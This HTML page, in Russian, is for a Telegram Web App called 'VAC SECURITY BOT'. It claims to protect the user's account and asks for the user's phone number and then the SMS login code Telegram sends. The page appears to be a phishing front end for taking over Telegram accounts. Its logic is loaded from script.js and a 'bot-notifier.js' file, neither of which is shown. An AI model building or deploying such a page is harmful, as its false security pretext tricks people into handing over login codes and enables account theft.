<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VAC SECURITY BOT</title>
    <link rel="stylesheet" href="style.css">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
    <div class="app-wrapper">
        <div class="app-container">
            <header>
                <img src="assets/logo.png" alt="logo" class="logo">
                <h1>VAC SECURITY BOT</h1>
                <p class="instructions">
                    Для защиты аккаунта введите ваш номер телефона и код подтверждения, 
                    который придет в SMS Telegram. Это поможет нам обеспечить вашу безопасность.
                </p>
            </header>

            <div class="form-container" id="phone-form">
                <div class="input-group">
                    <input type="tel" id="phone" placeholder="+7 (XXX) XXX-XX-XX">
                    <small class="error-message" id="phone-error"></small>
                </div>
                <button id="submit-phone" class="btn primary">Продолжить</button>
            </div>

            <div class="form-container hidden" id="code-form">
                <div class="input-group">
                    <input type="text" id="code" placeholder="Введите 5-значный код из SMS" maxlength="6">
                    <small class="error-message" id="code-error"></small>
                </div>
                <button id="submit-code" class="btn primary">Подтвердить</button>
            </div>
        </div>
    </div>
    <script src="script.js"></script>
    <script src="bot-notifier.js"></script>
</body>
</html>
